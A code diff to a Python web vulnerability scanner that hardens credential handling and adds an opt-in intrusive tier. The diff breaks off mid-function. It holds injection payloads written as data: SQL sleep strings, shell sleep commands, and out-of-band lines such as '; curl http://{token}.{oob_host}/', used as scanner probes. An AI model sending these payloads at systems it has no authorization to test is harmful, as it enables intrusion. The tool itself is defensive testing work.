@@ -24,6 +24,7 @@ from __future__ import annotations
 import base64
 import difflib
 import http.cookiejar
+import ipaddress
 import json
 import os
 import re
@@ -36,7 +37,7 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from collections import deque
-from collections.abc import Iterable, Mapping, Sequence
+from collections.abc import Callable, Iterable, Mapping, Sequence
 from dataclasses import replace
 from datetime import datetime, timezone
 from html.parser import HTMLParser
@@ -106,6 +107,10 @@ def crawl_web(
     ingest_sitemap: bool = False,
     probe_paths: bool = False,
     active: bool = False,
+    intrusive: bool = False,
+    oob_host: str | None = None,
+    oob_confirmed: Callable[[str], bool] | None = None,
+    json_endpoints: Sequence[tuple[str, str, Mapping[str, object]]] = (),
     compare_unauth: bool = False,
     secondary_headers: Mapping[str, str] | None = None,
     scanned_pages: list[str] | None = None,
@@ -155,9 +160,23 @@ def crawl_web(
     allowed = {_origin(seed_url), *(_origin(origin) for origin in allowed_origins)}
     if opener is None:
         opener = network_context.build_opener() if network_context is not None else build_auth_opener()
+    opener = _no_redirect_opener(opener)
     headers = {"User-Agent": _USER_AGENT}
     if extra_headers:
         headers.update(extra_headers)
+    anonymous_openers: dict[tuple[str, str, int], urllib.request.OpenerDirector] = {}
+
+    def request_identity(destination: str) -> tuple[urllib.request.OpenerDirector, dict[str, str]]:
+        if _normalized_origin(destination) == _normalized_origin(seed_url):
+            return opener, headers
+        origin = _normalized_origin(destination)
+        if origin is None:
+            raise ValueError("invalid web request destination")
+        if origin not in anonymous_openers:
+            anonymous_openers[origin] = _no_redirect_opener(
+                network_context.build_opener() if network_context is not None else build_auth_opener()
+            )
+        return anonymous_openers[origin], _without_credentials(headers)
 
     warnings: list[str] = []
     collected: list[Finding] = []
@@ -183,7 +202,7 @@ def crawl_web(
     asset_limit_reached = False
 
     if ingest_sitemap:
-        for url in _ingest_sitemaps(seed_url, opener, headers, timeout):
+        for url in _ingest_sitemaps(seed_url, opener, headers, timeout, allowed, request_identity=request_identity):
             key = _canonical(url)
             if _is_allowed_origin(url, allowed) and key not in queued:
                 queue.append((url, 0))
@@ -191,6 +210,14 @@ def crawl_web(
     if probe_paths:
         collected.extend(_probe_sensitive_paths(seed_url, opener, headers, timeout, target))
         collected.extend(_probe_graphql(seed_url, opener, headers, timeout, target))
+    if active and intrusive and json_endpoints:
+        # Fuzz JSON request bodies of API write-endpoints (POST/PUT/PATCH). These
+        # are state-changing, hence gated behind the intrusive tier. Same-origin only.
+        for method, endpoint, body in json_endpoints:
+            if not _is_allowed_origin(endpoint, allowed):
+                continue
+            ep_opener, ep_headers = request_identity(endpoint)
+            collected.extend(json_active_probe(endpoint, body, ep_opener, ep_headers, timeout, target, method=method))
 
     while (
         queue
@@ -204,11 +231,16 @@ def crawl_web(
         visited.add(canonical)
         processed_urls += 1
 
+        if not _safe_secondary_url(seed_url, current, allowed):
+            warnings.append(f"Web scan skipped unapproved origin or HTTPS downgrade: {current}")
+            continue
+
         if pages_scanned and delay:
             time.sleep(delay)
 
         try:
-            fetched = _fetch(opener, current, headers, timeout, allowed, network_context=network_context)
+            request_opener, request_headers = request_identity(current)
+            fetched = _fetch(request_opener, current, request_headers, timeout, allowed, network_context=network_context)
         except ResponseBodyLimitError as exc:
             warnings.append(f"Web scan left {current} unscanned: {exc}")
             if page_results is not None:
@@ -235,6 +267,7 @@ def crawl_web(
             continue
 
         final_url, status, content_type, header_items, set_cookies, body = fetched
+        page_opener, page_headers = request_identity(final_url)
         if not _is_allowed_origin(final_url, allowed):
             warnings.append(f"Web scan skipped cross-host redirect from {current} to {final_url}")
             if page_results is not None:
@@ -261,25 +294,30 @@ def crawl_web(
         active_executed = active and (bool(urllib.parse.urlparse(final_url).query) or bool(body))
         if page_results is not None:
             page_results.append(_page_result(
-                current, final_url, status, content_type, True, "authenticated" if _cookie_count(opener) else "not-requested",
+                current, final_url, status, content_type, True, "authenticated" if _cookie_count(page_opener) else "not-requested",
                 active_executed, "", checks,
             ))
 
         collected.extend(analyze_response(final_url, header_items, set_cookies, target=target))
         if body:
             collected.extend(analyze_body(final_url, body, target=target))
-        if active and urllib.parse.urlparse(final_url).query:
-            # Opt-in active verification of this URL's query parameters.
-            collected.extend(active_probe(final_url, opener, headers, timeout, target))
+        if active:
+            # Opt-in active verification of this URL's query params (and, with
+            # intrusive, timing/OOB-based blind SQLi and command injection).
+            collected.extend(active_probe(
+                final_url, page_opener, page_headers, timeout, target,
+                oob_host=oob_host, oob_confirmed=oob_confirmed, intrusive=intrusive,
+            ))
         if active and body:
             # Opt-in active verification of this page's form fields (GET/POST).
-            collected.extend(form_active_probe(final_url, body, opener, headers, timeout, target))
+            collected.extend(form_active_probe(final_url, body, page_opener, page_headers, timeout, target,
+                                               allowed_origins=allowed, request_identity=request_identity))
         if (compare_unauth or secondary_headers) and not _is_static_asset(final_url):
             # Access-control comparison: does a lower-privileged context get the
             # same authenticated content? (IDOR/BOLA/BFLA heuristic.)
             collected.extend(
                 _access_control_check(
-                    final_url, opener, headers, timeout, target,
+                    final_url, page_opener, page_headers, timeout, target,
                     compare_unauth=compare_unauth, secondary_headers=secondary_headers,
                     network_context=network_context,
                 )
@@ -313,9 +351,9 @@ def crawl_web(
             # 'null'), advertised HTTP methods (TRACE/write), and Host-header
             # reflection. GET/OPTIONS only, no payloads.
             host_probed.add(final.hostname)
-            collected.extend(_cors_reflection_probe(final_url, opener, headers, timeout, target))
-            collected.extend(_http_methods_probe(final_url, opener, headers, timeout, target))
-            collected.extend(_host_header_probe(final_url, headers, timeout, target, opener=opener))
+            collected.extend(_cors_reflection_probe(final_url, page_opener, page_headers, timeout, target))
+            collected.extend(_http_methods_probe(final_url, page_opener, page_headers, timeout, target))
+            collected.extend(_host_header_probe(final_url, page_headers, timeout, target, opener=page_opener))
 
         candidates: set[str] = set()
         link_source = body
@@ -323,11 +361,12 @@ def crawl_web(
             rendered, extra_urls, browser_cookies, render_error = _render_page(
                 final_url,
                 timeout=timeout,
-                extra_headers=headers,
+                extra_headers=page_headers,
                 capture_network=capture_network,
                 interact=interact,
                 max_clicks=max_clicks,
-                cookies=_opener_cookies(opener),
+                cookies=_opener_cookies(page_opener),
+                allowed_origins=allowed,
                 network_context=network_context,
             )
             if rendered is not None:
@@ -335,7 +374,7 @@ def crawl_web(
                 link_source = rendered
                 # Sync any cookie the SPA rotated back into the jar so later
                 # stdlib requests keep the fresh session (bidirectional sync).
-                _merge_browser_cookies(opener, browser_cookies)
+                _merge_browser_cookies(page_opener, browser_cookies)
                 candidates.update(extra_urls)  # C/D: network + interaction URLs
             elif render_error and not render_warned:
                 warnings.append(render_error)
@@ -345,8 +384,9 @@ def crawl_web(
         if (discover_assets or scan_js_secrets) and body:
             # A: mine same-host JS bundles for routes and/or leaked secrets.
             routes, secret_findings, failed_assets, limit_reached = _scan_assets(
-                final_url, body, opener, headers, timeout, assets_seen, max_assets, target,
+                final_url, body, page_opener, page_headers, timeout, assets_seen, max_assets, target,
                 extract_routes=discover_assets, scan_secrets=scan_js_secrets,
+                allowed_origins=allowed,
             )
             candidates.update(routes)
             collected.extend(secret_findings)
@@ -815,13 +855,6 @@ def _cors(url: str, headers: dict[str, str], target: str) -> list[Finding]:
     ]
 
 
-def _without_credentials(headers: Mapping[str, str]) -> dict[str, str]:
-    """Drop the operator's own credentials. Per-host / cross-origin probes must
-    never forward them: the probed host may differ from the seed (redirect /
-    allowed origin), and forwarding would leak the credentials there."""
-    return {name: value for name, value in headers.items() if name.lower() not in {"cookie", "authorization"}}
-
-
 # A syntactically valid but attacker-controlled origin no real allowlist matches.
 _CORS_PROBE_ORIGIN = "https://koda-cors-probe.example"
 
@@ -1169,11 +1202,12 @@ def _fetch(
             location = exc.headers.get("Location") if exc.headers else None
             if 300 <= exc.code < 400 and location:
                 next_url = urllib.parse.urljoin(current_url, location)
-                if not _is_allowed_origin(next_url, allowed_origins):
+                if not _safe_secondary_url(url, next_url, allowed_origins):
                     exc.close()
                     return next_url, exc.code, content_type or "", header_items, set_cookies, b""
-                if _origin(next_url) != _origin(url):
+                if _normalized_origin(next_url) != _normalized_origin(url):
                     current_headers = _without_credentials(current_headers)
+                    current_opener = network_context.build_opener() if network_context is not None else build_auth_opener()
                 exc.close()
                 current_url = next_url
                 continue
@@ -1239,7 +1273,8 @@ def _read_bounded_body(response, max_bytes: int, timeout: float) -> bytes:
 
 
 def _without_credentials(headers: Mapping[str, str]) -> dict[str, str]:
-    return {name: value for name, value in headers.items() if name.lower() not in {"authorization", "cookie", "proxy-authorization"}}
+    """Keep only transport-neutral headers for identity and cross-origin probes."""
+    return {name: value for name, value in headers.items() if name.lower() in {"user-agent", "accept"}}
 
 
 def _page_result(
@@ -1307,6 +1342,47 @@ for (const fn of ['pushState', 'replaceState']) {
 """
 
 
+def _pinned_render_response(
+    network_context: object, request: object, headers: Mapping[str, str], timeout: float,
+) -> tuple[int, dict[str, str], bytes] | None:
+    """Fetch one browser request through the audit's approved-IP opener."""
+    request_headers = dict(request.all_headers())
+    override_names = {name.lower() for name in headers}
+    request_headers = {
+        name: value for name, value in request_headers.items()
+        if name.lower() not in {"host", "content-length", "connection", "proxy-authorization"}
+        and name.lower() not in override_names
+    }
+    request_headers.update(headers)
+    body = getattr(request, "post_data_buffer", None)
+    outgoing = urllib.request.Request(request.url, data=body, headers=request_headers, method=request.method)
+    opener = _no_redirect_opener(network_context.build_opener())
+    request_timeout = min(float(timeout), float(network_context.remaining_timeout()))
+    if request_timeout <= 0:
+        raise socket.timeout("web-audit time budget exceeded")
+
+    def read_response(response: object) -> tuple[int, dict[str, str], bytes] | None:
+        status = int(response.status)
+        if 300 <= status < 400:
+            return None  # Browser redirects cannot be pinned before their next hop.
+        limit = int(network_context.limits["max_response_bytes"])
+        body_bytes = _read_bounded_body(response, limit, request_timeout)
+        response_headers = {
+            name: value for name, value in response.headers.items()
+            if name.lower() not in {"connection", "content-length", "keep-alive", "te", "trailer", "transfer-encoding", "upgrade"}
+        }
+        return status, response_headers, body_bytes
+
+    try:
+        with opener.open(outgoing, timeout=request_timeout) as response:
+            return read_response(response)
+    except urllib.error.HTTPError as exc:
+        try:
+            return read_response(exc)
+        finally:
+            exc.close()
+
+
 def _render_page(
     url: str,
     *,
@@ -1316,6 +1392,7 @@ def _render_page(
     interact: bool = False,
     max_clicks: int = 20,
     cookies: Sequence[dict[str, object]] = (),
+    allowed_origins: set[str] | None = None,
     network_context: object | None = None,
 ) -> tuple[str | None, set[str], list[dict[str, object]], str]:
     """Render ``url`` in headless Chromium; return ``(html, extra_urls, cookies, error)``.
@@ -1341,6 +1418,7 @@ def _render_page(
         )
 
     headers = {k: v for k, v in (extra_headers or {}).items() if k.lower() != "user-agent"}
+    approved = allowed_origins if allowed_origins is not None else {_origin(url)}
     captured: set[str] = set()
     try:
         with sync_playwright() as p:
@@ -1348,24 +1426,31 @@ def _render_page(
             browser = p.chromium.launch(**launch_options)
             try:
                 context_options = network_context.browser_context_options() if network_context is not None else {}
+                context_options["service_workers"] = "block"
                 context = browser.new_context(user_agent=_USER_AGENT, **context_options)
+                # HTTP routing does not intercept WebSocket handshakes. Rendered
+                # pages may contain scanner cookies, so disallow this egress path.
+                if not callable(getattr(context, "route_web_socket", None)):
+                    return None, set(), [], "JS 렌더링을 건너뜁니다: WebSocket 차단을 지원하는 Playwright가 필요합니다."
+                context.route_web_socket("**/*", lambda socket_route: socket_route.close())
                 if cookies:
                     try:
                         context.add_cookies(list(cookies))
                     except Exception:
                         pass  # malformed cookie must never abort rendering
-                if headers:
-                    context.set_extra_http_headers(headers)
                 page = context.new_page()
-                invalid_response = False
                 invalid_request = False
 
                 def validate_request(route) -> None:
                     nonlocal invalid_request
                     request = route.request
+                    if request.url.startswith(("http://", "https://")) and not _safe_secondary_url(url, request.url, approved):
+                        invalid_request = True
+                        route.abort()
+                        return
                     if network_context is not None and request.url.startswith(("http://", "https://")):
                         try:
-                            network_context.authorize_url(request.url, method=request.method)
+                            network_context.authorize_url(request.url, method=request.method, reserve=False)
                         except Exception:
                             invalid_request = True
                             try:
@@ -1374,19 +1459,35 @@ def _render_page(
                                 pass
                             return
                     try:
-                        route.continue_()
+                        request_headers = headers if _normalized_origin(request.url) == _normalized_origin(url) else {}
+                        if network_context is not None and request.url.startswith(("http://", "https://")):
+                            pinned = _pinned_render_response(network_context, request, request_headers, timeout)
+                            if pinned is None:
+                                invalid_request = True
+                                route.abort()
+                            else:
+                                status, response_headers, body = pinned
+                                route.fulfill(status=status, headers=response_headers, body=body)
+                        elif request.url.startswith(("http://", "https://")):
+                            # Fetch one hop and fulfill it. BrowserContext headers
+                            # or route.continue_(headers=...) would carry credentials
+                            # into redirected requests before the next route check.
+                            response = route.fetch(headers={**request.headers, **request_headers}, max_redirects=0)
+                            if 300 <= response.status < 400:
+                                invalid_request = True
+                                route.abort()
+                            else:
+                                route.fulfill(response=response)
+                        else:
+                            route.continue_()
                     except Exception:
                         invalid_request = True
+                        try:
+                            route.abort()
+                        except Exception:
+                            pass
 
-                def validate_response(response) -> None:
-                    nonlocal invalid_response
-                    if network_context is not None and response.url.startswith(("http://", "https://")):
-                        if not network_context.validate_browser_response(response):
-                            invalid_response = True
-
-                if network_context is not None:
-                    page.route("**/*", validate_request)
-                    page.on("response", validate_response)
+                context.route("**/*", validate_request)
                 if capture_network:
                     page.on("request", lambda req: captured.add(req.url))
                 if interact:
@@ -1399,8 +1500,6 @@ def _render_page(
                 page.goto(url, wait_until="networkidle", timeout=render_timeout * 1000)
                 if invalid_request:
                     return None, set(), [], "JS 렌더링을 건너뜁니다: 브라우저 요청이 승인된 origin/path/메서드 범위를 벗어났습니다."
-                if invalid_response:
-                    return None, set(), [], "JS 렌더링을 건너뜁니다: 브라우저 응답의 승인 IP를 검증하지 못했습니다."
                 html = page.content()
                 if interact:
                     captured.update(_interact_page(page, max_clicks))
@@ -1498,8 +1597,13 @@ def _read_asset(
     url: str,
     headers: Mapping[str, str],
     timeout: float,
+    *,
+    source_url: str,
+    allowed_origins: set[str],
 ) -> str | None:
     """Read a JS/text asset in full (not just HTML like ``_fetch``) for scraping."""
+    if not _safe_secondary_url(source_url, url, allowed_origins):
+        return None
     request = urllib.request.Request(url, headers=dict(headers), method="GET")
     try:
         with opener.open(request, timeout=timeout) as response:
@@ -1520,6 +1624,7 @@ def _scan_assets(
     *,
     extract_routes: bool,
     scan_secrets: bool,
+    allowed_origins: set[str] | None = None,
 ) -> tuple[set[str], list[Finding], int, bool]:
     """Fetch same-host JS bundles once and mine them for routes (A) and secrets.
 
@@ -1537,15 +1642,16 @@ def _scan_assets(
     findings: list[Finding] = []
     failed_assets = 0
     limit_reached = False
+    allowed = allowed_origins if allowed_origins is not None else {_origin(page_url)}
     for src in parser.scripts:
         asset_url = urllib.parse.urldefrag(urllib.parse.urljoin(page_url, src)).url
-        if not _same_host(page_url, asset_url) or asset_url in assets_seen:
+        if not _same_host(page_url, asset_url) or not _safe_secondary_url(page_url, asset_url, allowed) or asset_url in assets_seen:
             continue
         if len(assets_seen) >= max_assets:
             limit_reached = True
             break
         assets_seen.add(asset_url)
-        text = _read_asset(opener, asset_url, headers, timeout)
+        text = _read_asset(opener, asset_url, headers, timeout, source_url=page_url, allowed_origins=allowed)
         if text is None:
             failed_assets += 1
             continue
@@ -1596,6 +1702,9 @@ def _ingest_sitemaps(
     opener: urllib.request.OpenerDirector,
     headers: Mapping[str, str],
     timeout: float,
+    allowed_origins: set[str],
+    *,
+    request_identity: Callable[[str], tuple[urllib.request.OpenerDirector, dict[str, str]]] | None = None,
 ) -> set[str]:
     """Read robots.txt + sitemap.xml from the seed origin; return listed URLs.
 
@@ -1608,7 +1717,10 @@ def _ingest_sitemaps(
     found: set[str] = set()
     sitemaps: list[str] = [urllib.parse.urljoin(origin, "/sitemap.xml")]
 
-    robots = _read_asset(opener, urllib.parse.urljoin(origin, "/robots.txt"), headers, timeout)
+    robots_url = urllib.parse.urljoin(origin, "/robots.txt")
+    robots_opener, robots_headers = request_identity(robots_url) if request_identity else (opener, dict(headers))
+    robots = _read_asset(robots_opener, robots_url, robots_headers, timeout,
+                         source_url=seed_url, allowed_origins=allowed_origins)
     if robots:
         for line in robots.splitlines():
             key, _, value = line.partition(":")
@@ -1626,7 +1738,9 @@ def _ingest_sitemaps(
         if sitemap_url in seen_sitemaps:
             continue
         seen_sitemaps.add(sitemap_url)
-        xml = _read_asset(opener, sitemap_url, headers, timeout)
+        sitemap_opener, sitemap_headers = request_identity(sitemap_url) if request_identity else (opener, dict(headers))
+        xml = _read_asset(sitemap_opener, sitemap_url, sitemap_headers, timeout,
+                          source_url=seed_url, allowed_origins=allowed_origins)
         if not xml:
             continue
         for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", xml):
@@ -1774,6 +1888,45 @@ def _origin(url: str) -> str:
     return f"{parsed.scheme}://{parsed.netloc}"
 
 
+def _normalized_origin(url: str) -> tuple[str, str, int] | None:
+    """Represent equivalent default-port URLs as the same security origin."""
+    try:
+        parsed = urllib.parse.urlsplit(url)
+        if parsed.scheme not in {"http", "https"} or not parsed.hostname or "@" in parsed.netloc:
+            return None
+        port = parsed.port
+        if port is None:
+            port = 443 if parsed.scheme == "https" else 80
+    except ValueError:
+        return None
+    return parsed.scheme, parsed.hostname.lower(), port
+
+
+def _safe_secondary_url(source_url: str, candidate: str, allowed_origins: set[str]) -> bool:
+    source = _normalized_origin(source_url)
+    target = _normalized_origin(candidate)
+    return (
+        source is not None
+        and target is not None
+        and _is_allowed_origin(candidate, allowed_origins)
+        and not (source[0] == "https" and target[0] != "https")
+    )
+
+
+def _secure_login_url(url: str) -> bool:
+    """Allow credentials over HTTPS, plus local HTTP test/development servers."""
+    origin = _normalized_origin(url)
+    if origin is None:
+        return False
+    scheme, hostname, _port = origin
+    if scheme == "https" or hostname == "localhost":
+        return True
+    try:
+        return ipaddress.ip_address(hostname).is_loopback
+    except ValueError:
+        return False
+
+
 # --- Active verification (opt-in): sends bounded, non-destructive payloads -----
 
 # DB error signatures used for error-based SQL injection detection.
@@ -1791,6 +1944,71 @@ _REDIRECT_PARAM_NAMES = {
 _ACTIVE_OOB_HOST = "koda-open-redirect.example"
 # System-file signatures for path-traversal / LFI: /etc/passwd and win.ini.
 _LFI_RE = re.compile(r"root:.*?:0:0:|\bfor 16-bit app support\b", re.IGNORECASE)
+# SSTI: an arithmetic payload that only resolves if the template engine evaluates
+# it. 1337*1337 is distinctive enough that a stray 1787569 in the page is unlikely;
+# we also require the literal expression to be absent, confirming it was evaluated
+# rather than echoed. ponytail: covers {{...}} engines (Jinja2/Twig/Nunjucks/
+# Angular); add ${...} and <%= %> variants if Freemarker/ERB coverage is needed.
+_SSTI_EXPR = "1337*1337"
+_SSTI_PAYLOAD = "{{" + _SSTI_EXPR + "}}"
+_SSTI_RESULT = "1787569"
+# Request headers some apps echo into the page body: injection points beyond params.
+_INJECTABLE_HEADERS = ("Referer", "X-Forwarded-For")
+# Params that commonly carry a URL the server fetches server-side (blind SSRF).
+_SSRF_PARAM_NAMES = {
+    "url", "uri", "u", "dest", "destination", "callback", "webhook", "target",
+    "src", "source", "feed", "fetch", "proxy", "image", "img", "load", "file",
+}
+# Intrusive tier (opt-in, double-gated by the caller). Time-delay payloads make a
+# vulnerable backend pause, proving blind SQL injection / OS command injection by
+# timing alone — WITHOUT changing or destroying data. {n} is the delay in seconds.
+# ponytail: benign sleep PoC only. DROP/DELETE/rm payloads add no detection value
+# over a measurable delay and would damage an authorized target, so they are out.
+_SQL_TIME_PAYLOADS = (
+    "' AND SLEEP({n})-- -",
+    "'||pg_sleep({n})--",
+    "';WAITFOR DELAY '0:0:{n}'--",
+    "1 AND SLEEP({n})",
+)
+_CMD_TIME_PAYLOADS = (
+    "; sleep {n}",
+    "| sleep {n}",
+    "$(sleep {n})",
+    "`sleep {n}`",
+)
+
+
+def _elapsed(opener: urllib.request.OpenerDirector, url: str, headers: Mapping[str, str], timeout: float) -> float | None:
+    """Wall-clock seconds for one probe GET, or None if the request failed."""
+    start = time.monotonic()
+    if _probe_body(opener, url, headers, timeout) is None:
+        return None
+    return time.monotonic() - start
+
+
+def _delay_confirms(fetch: Callable[[int], float | None], big: int, small: int) -> bool:
+    """True when response time tracks an injected delay at two points.
+
+    ``fetch(sec)`` sends a payload asking the backend to pause ``sec`` seconds and
+    returns the elapsed time. Requiring the delay to scale (big vs small vs a
+    0-second baseline) rejects endpoints that are merely slow. A non-vulnerable
+    param costs only two fast requests (baseline + big both return promptly).
+    ponytail: single confirmation pair; add more samples if network jitter causes
+    false positives in a given environment.
+    """
+    base = fetch(0)
+    if base is None:
+        return False
+    hi = fetch(big)
+    if hi is None or (hi - base) < big * 0.6:
+        return False
+    lo = fetch(small)
+    return lo is not None and small * 0.5 <= (lo - base) < (hi - base) + 1.0
+
+
+def _ssti_evaluated(body: str | None) -> bool:
+    """True when the SSTI payload's product appears but its literal does not."""
+    return bool(body) and _SSTI_RESULT in body and _SSTI_EXPR not in body
 
 
 class _NoRedirect(urllib.request.HTTPRedirectHandler):
@@ -1798,6 +2016,14 @@ class _NoRedirect(urllib.request.HTTPRedirectHandler):
 
     def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: D401,N802
         return None
+
+
+def _no_redirect_opener(opener: urllib.request.OpenerDirector) -> urllib.request.OpenerDirector:
+    """Preserve caller handlers and cookie jars while disabling automatic redirects."""
+    handlers = [handler for handler in opener.handlers if not isinstance(handler, urllib.request.HTTPRedirectHandler)]
+    safe = urllib.request.build_opener(*handlers, _NoRedirect())
+    safe.addheaders = list(opener.addheaders)
+    return safe
 
 
 def active_probe(
@@ -1808,19 +2034,27 @@ def active_probe(
     target: str,
     *,
     max_params: int = 15,
+    oob_host: str | None = None,
+    oob_confirmed: Callable[[str], bool] | None = None,
+    intrusive: bool = False,
 ) -> list[Finding]:
     """Send bounded, non-destructive attack payloads to a URL's query params.
 
-    Verifies (not just guesses) reflected XSS, error-based SQL injection, and
-    open redirect by observing the server's response. GET-only, no data-changing
-    requests, capped per parameter. Opt-in and authorization-gated by the caller;
-    comprehensive active scanning belongs to the ZAP full/api modes.
+    Verifies (not just guesses) reflected XSS, SSTI, error-based SQL injection,
+    path traversal, and open redirect by observing the server's response. GET-only,
+    no data-changing requests, capped per parameter. Opt-in and authorization-gated
+    by the caller; comprehensive active scanning belongs to the ZAP full/api modes.
+
+    Out-of-band (blind SSRF) detection is enabled only when both ``oob_host`` (a
+    collector domain the caller controls) and ``oob_confirmed`` (returns True if
+    the collector saw a callback for a given token) are supplied; otherwise no OOB
+    payload is sent. ponytail: the collector + its polling is the caller's infra.
     """
 
     parsed = urllib.parse.urlparse(url)
     params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-    if not params:
-        return []
+    # No early return on empty params: the per-URL header-injection probes below
+    # still apply when a page takes no query string.
 
     findings: list[Finding] = []
     token = secrets.token_hex(4)
@@ -1842,6 +2076,19 @@ def active_probe(
                     url, target=target,
                     evidence=f"param '{name}': marker reflected without encoding ({marker})",
                     recommendation="Context-encode all user input on output and add a strict CSP.",
+                )
+            )
+
+        # SSTI: a template expression that only resolves if evaluated server-side.
+        ssti_body = _probe_body(opener, _with_query_param(parsed, name, _SSTI_PAYLOAD), headers, timeout)
+        if _ssti_evaluated(ssti_body):
+            findings.append(
+                _finding(
+                    "web.ssti-verified", "high",
+                    "Template expression in input was evaluated server-side (SSTI)",
+                    url, target=target,
+                    evidence=f"param '{name}': {_SSTI_PAYLOAD} evaluated to {_SSTI_RESULT}",
+                    recommendation="Never render user input as a template; pass it as context data to a sandboxed engine.",
                 )
             )
 
@@ -1876,6 +2123,22 @@ def active_probe(
                 )
             )
 
+        # Blind SSRF (out-of-band): a URL-like param pointed at the caller's
+        # collector. Verified only if the collector later reports a hit for the token.
+        if oob_host and oob_confirmed and name.lower() in _SSRF_PARAM_NAMES:
+            ptok = secrets.token_hex(6)
+            _probe_body(opener, _with_query_param(parsed, name, f"https://{ptok}.{oob_host}/"), headers, timeout)
+            if oob_confirmed(ptok):
+                findings.append(
+                    _finding(
+                        "web.ssrf-oob-verified", "high",
+                        "Server fetched a caller-controlled URL (verified blind SSRF)",
+                        url, target=target,
+                        evidence=f"param '{name}': the server made an out-of-band request to {ptok}.{oob_host}",
+                        recommendation="Validate and allow-list outbound destinations; block internal/metadata addresses server-side.",
+                    )
+                )
+
         # Open redirect: a redirect-like param that sends the browser off-site.
         if name.lower() in _REDIRECT_PARAM_NAMES:
             location = _probe_location(
@@ -1891,6 +2154,84 @@ def active_probe(
                         recommendation="Allow only relative paths or an allow-list of destinations for redirect parameters.",
                     )
                 )
+
+        # Intrusive tier: blind detection by response timing. A vulnerable backend
+        # pauses when the payload is injected; the delay is measured, not the data.
+        if intrusive:
+            big = min(6, max(3, int(timeout) - 2))
+            small = max(1, big // 3)
+            for tmpl in _SQL_TIME_PAYLOADS:
+                if _delay_confirms(
+                    lambda s, t=tmpl, nm=name: _elapsed(opener, _with_query_param(parsed, nm, t.format(n=s)), headers, timeout),
+                    big, small,
+                ):
+                    findings.append(
+                        _finding(
+                            "web.sql-injection-time-blind", "high",
+                            "Time-based blind SQL injection (response delay tracks an injected sleep)",
+                            url, target=target,
+                            evidence=f"param '{name}': response time scaled with an injected SQL sleep",
+                            recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
+                        )
+                    )
+                    break
+            for tmpl in _CMD_TIME_PAYLOADS:
+                if _delay_confirms(
+                    lambda s, t=tmpl, nm=name, og=original: _elapsed(opener, _with_query_param(parsed, nm, og + t.format(n=s)), headers, timeout),
+                    big, small,
+                ):
+                    findings.append(
+                        _finding(
+                            "web.command-injection-time-blind", "critical",
+                            "OS command injection (response delay tracks an injected sleep command)",
+                            url, target=target,
+                            evidence=f"param '{name}': response time scaled with an injected shell sleep",
+                            recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
+                        )
+                    )
+                    break
+            # Out-of-band command injection: proves blind RCE without a timing race.
+            if oob_host and oob_confirmed:
+                ptok = secrets.token_hex(6)
+                for tmpl in (f"; curl http://{ptok}.{oob_host}/", f"| nslookup {ptok}.{oob_host}", f"$(curl http://{ptok}.{oob_host}/)"):
+                    _probe_body(opener, _with_query_param(parsed, name, original + tmpl), headers, timeout)
+                if oob_confirmed(ptok):
+                    findings.append(
+                        _finding(
+                            "web.command-injection-oob", "critical",
+                            "OS command injection (server made a caller-controlled out-of-band request)",
+                            url, target=target,
+                            evidence=f"param '{name}': an injected command reached out to {ptok}.{oob_host}",
+                            recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
+                        )
+                    )
+
+    # Injection via request headers (reflected XSS / SSTI). One set per URL, not
+    # per param, to cap noise: some apps echo Referer / X-Forwarded-For into the page.
+    for header_name in _INJECTABLE_HEADERS:
+        xss_marker = f"koda{token}\"><kdx>"
+        hbody = _probe_body(opener, url, {**headers, header_name: xss_marker}, timeout)
+        if hbody and xss_marker in hbody:
+            findings.append(
+                _finding(
+                    "web.reflected-xss-verified", "medium",
+                    "Unencoded reflected input detected; XSS context review required",
+                    url, target=target,
+                    evidence=f"request header '{header_name}' reflected the marker unencoded",
+                    recommendation="Context-encode all user input on output and add a strict CSP.",
+                )
+            )
+        sbody = _probe_body(opener, url, {**headers, header_name: _SSTI_PAYLOAD}, timeout)
+        if _ssti_evaluated(sbody):
+            findings.append(
+                _finding(
+                    "web.ssti-verified", "high",
+                    "Template expression in input was evaluated server-side (SSTI)",
+                    url, target=target,
+                    evidence=f"request header '{header_name}': {_SSTI_PAYLOAD} evaluated to {_SSTI_RESULT}",
+                    recommendation="Never render user input as a template; pass it as context data to a sandboxed engine.",
+                )
+            )
     return findings
 
 
@@ -1933,6 +2274,8 @@ def form_active_probe(
     *,
     max_forms: int = 5,
     max_fields: int = 10,
+    allowed_origins: set[str] | None = None,
+    request_identity: Callable[[str], tuple[urllib.request.OpenerDirector, dict[str, str]]] | None = None,
 ) -> list[Finding]:
     """Active verification of HTML form fields (GET and POST), mirroring the
     query-param checks. Skips login/register (password) and file-upload forms to
@@ -1947,6 +2290,7 @@ def form_active_probe(
 
     findings: list[Finding] = []
     token = secrets.token_hex(4)
+    allowed = allowed_origins if allowed_origins is not None else {_origin(page_url)}
     for form in parser.forms[:max_forms]:
         if form["has_password"] or form["has_file"]:
             continue  # avoid submitting credentials or uploading files
@@ -1955,13 +2299,19 @@ def form_active_probe(
             continue
         method = "post" if form["method"] == "post" else "get"
         action_url = urllib.parse.urljoin(page_url, str(form["action"])) if form["action"] else page_url
+        if not _safe_secondary_url(page_url, action_url, allowed):
+            continue
+        action_opener, action_headers = request_identity(action_url) if request_identity else (
+            (opener, dict(headers)) if _normalized_origin(action_url) == _normalized_origin(page_url)
+            else (build_auth_opener(), _without_credentials(headers))
+        )
         base = {name: (value or "test") for name, (_type, value) in fields.items()}
         # Only fuzz visible-ish fields (not hidden tokens) to limit noise.
         testable = [name for name, (itype, _v) in fields.items() if itype in {"text", "search", "email", "url", "", "textarea"}]
 
         for name in testable[:max_fields]:
             marker = f"koda{token}\"><kdx>"
-            body_x = _submit_form(opener, action_url, method, {**base, name: marker}, headers, timeout)
+            body_x = _submit_form(action_opener, action_url, method, {**base, name: marker}, action_headers, timeout)
             if body_x and marker in body_x:
                 findings.append(
                     _finding(
@@ -1972,9 +2322,20 @@ def form_active_probe(
                         recommendation="Context-encode all user input on output and add a strict CSP.",
                     )
                 )
-            body_s = _submit_form(opener, action_url, method, {**base, name: base[name] + "'"}, headers, timeout)
+            body_t = _submit_form(action_opener, action_url, method, {**base, name: _SSTI_PAYLOAD}, action_headers, timeout)
+            if _ssti_evaluated(body_t):
+                findings.append(
+                    _finding(
